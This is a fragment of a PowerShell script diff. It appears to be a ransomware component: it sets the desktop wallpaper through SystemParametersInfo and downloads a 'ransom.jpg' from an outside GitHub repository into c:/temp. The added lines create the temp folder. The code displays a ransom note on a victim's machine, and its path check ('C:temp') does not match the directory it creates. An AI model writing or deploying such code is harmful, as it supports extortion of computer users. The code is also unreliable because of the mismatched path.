@@ -74,6 +74,9 @@ public class Params
     $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
 }
 
+If (!(Test-Path -Path "C:temp" -PathType Container))
+{ New-Item -Path $Destination -ItemType directory | Out-Null }
+
 $ransom = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/ransom.jpg"
 Invoke-WebRequest -Uri $ransom -OutFile "c:/temp/ransom.jpg"
  
